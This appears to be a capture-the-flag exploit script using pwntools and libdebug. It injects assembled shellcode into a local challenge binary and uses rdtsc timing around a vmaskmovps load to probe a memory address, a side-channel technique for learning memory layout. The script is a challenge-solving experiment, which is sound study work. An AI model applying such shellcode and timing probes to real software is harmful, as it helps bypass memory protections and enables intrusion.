from libdebug import debugger
from pwn import *


elf = context.binary = ELF("./main")
d = debugger("./main",aslr=False)
p = d.run()

d.breakpoint(0x555555555470,file="binary")
d.cont()

p.recvuntil("flag")

# mov     r8, 1
p.sendline(asm(f"""
mov     r8, 0x555555555470

rdtsc
shl     rdx, 32
or      rax, rdx
mov     r10, rax        

vmaskmovps ymm1, ymm1, [r8]

xor     rax, rax
rdtsc
shl     rdx, 32
or      rax, rdx
mov     r11, rax   
                    
sub     r11, r10    
nop    
nop    
nop    
nop    
nop    
nop    
nop    
""")) 


# 0x1337107d:	sub    r11,r10
d.breakpoint(0x13371080)
d.cont()

print(f"r11 is {hex(d.regs.r11)}")



